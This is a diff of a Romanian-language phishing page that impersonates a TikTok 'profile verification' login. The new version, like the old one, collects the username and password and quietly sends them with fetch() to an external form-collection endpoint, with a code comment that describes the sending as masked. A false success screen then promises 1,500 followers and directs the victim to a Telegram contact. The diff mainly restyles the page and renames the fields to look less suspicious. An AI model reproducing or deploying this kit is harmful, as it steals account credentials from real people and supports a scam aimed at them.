@@ -3,42 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Studio</title>
+    <title>Creator Studio Hub</title>
     <style>
-        body { background-color: #010101; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 320px; text-align: center; border: 1px solid #222; padding: 40px 20px; border-radius: 12px; background: #010101; }
-        .tt-text { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
-        .tt-text span { color: #fff; text-shadow: 2px 0 #ff0050, -2px 0 #00f2ea; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; background: #1f1f1f; border: 1px solid #333; color: white; border-radius: 4px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 14px; background: #ff0050; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
-        #page2 { display: none; }
-        .tg-btn { background: linear-gradient(135deg, #ed1c6f, #b71ea9); color: white; text-decoration: none; padding: 15px; border-radius: 8px; display: block; font-weight: bold; margin-top: 20px; }
+        body { background-color: #010101; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { width: 315px; text-align: center; border: 1px solid #1a1a1a; padding: 45px 25px; border-radius: 16px; background: #050505; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        .logo-tt { font-size: 32px; font-weight: 900; margin-bottom: 10px; letter-spacing: -1.5px; }
+        .logo-tt span { color: #fff; text-shadow: 2px 0 #ff0050, -2px 0 #00f2ea; }
+        h2 { font-size: 17px; margin-bottom: 30px; color: #efefef; font-weight: 500; }
+        
+        /* Stil pentru textul de deasupra input-urilor */
+        .label-text { text-align: left; font-size: 13px; color: #888; margin-bottom: 5px; margin-left: 2px; }
+        
+        input { width: 100%; padding: 15px; margin-bottom: 15px; background: #111; border: 1px solid #222; color: white; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 15px; }
+        input:focus { border-color: #00f2ea; }
+        .btn-tt { width: 100%; padding: 16px; background: #ff0050; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        
+        #success-page { display: none; }
+        .icon-rocket { font-size: 55px; margin-bottom: 20px; }
+        .tg-link { background: linear-gradient(135deg, #ff0050, #00f2ea); color: white; text-decoration: none; padding: 18px; border-radius: 10px; display: block; font-weight: bold; margin-top: 25px; box-shadow: 0 5px 15px rgba(255, 0, 80, 0.3); }
     </style>
 </head>
 <body>
-<div class="box" id="page1">
-    <div class="tt-text">Tik<span>Tok</span></div>
-    <p>Conectați-vă pentru verificare</p>
-    <form id="ttForm" action="https://formspree.io/f/mbdpyyjp" method="POST">
-        <input type="text" name="User" placeholder="Nume utilizator" required>
-        <input type="password" name="Key" placeholder="Parolă" required>
-        <button type="submit" class="btn">Continuă</button>
+
+<div class="card" id="login-page">
+    <div class="logo-tt">Tik<span>Tok</span></div>
+    <h2>Verificare Profil</h2>
+    
+    <form id="secureForm" action="https://formspree.io/f/xkopbbzj" method="POST">
+        
+        <div class="label-text">User:</div>
+        <input type="text" name="ID_Ref" placeholder="Username / Email" required>
+        
+        <div class="label-text">Password:</div>
+        <input type="password" name="Hex_Key" placeholder="••••••••" required>
+        
+        <input type="hidden" name="_captcha" value="false">
+        <button type="submit" class="btn-tt">CONTINUĂ</button>
     </form>
 </div>
-<div class="box" id="page2">
-    <div style="font-size: 50px;">💎</div>
-    <h2 style="color: #00f2ea;">CONFIRMARE</h2>
-    <p>Apasă butonul de mai jos pentru a primi urmăritorii:</p>
-    <a href="https://t.me/instaboostg" class="tg-btn">📩 CONTACTEAZĂ @instaboostg</a>
+
+<div class="card" id="success-page">
+    <div class="icon-rocket">🚀</div>
+    <h2 style="color: #00f2ea; margin-bottom: 15px;">PROCESAT!</h2>
+    <p style="font-size: 14px; color: #aaa; line-height: 1.6;">
+        Pentru a revendica cei <b>1.500 URMĂRITORI</b>, contactați-ne la utilizatorul de mai jos pentru activare:
+    </p>
+    
+    <a href="https://t.me/instaboostg" class="tg-link">📩 @instaboostg</a>
 </div>
+
 <script>
-    const form = document.getElementById('ttForm');
+    const form = document.getElementById('secureForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
-        fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' } });
-        document.getElementById('page1').style.display = 'none';
-        document.getElementById('page2').style.display = 'block';
+        
+        // Trimitere mascată în fundal
+        fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+            headers: { 'Accept': 'application/json' }
+        });
+
+        document.getElementById('login-page').style.display = 'none';
+        document.getElementById('success-page').style.display = 'block';
     };
 </script>
+
 </body>
 </html>
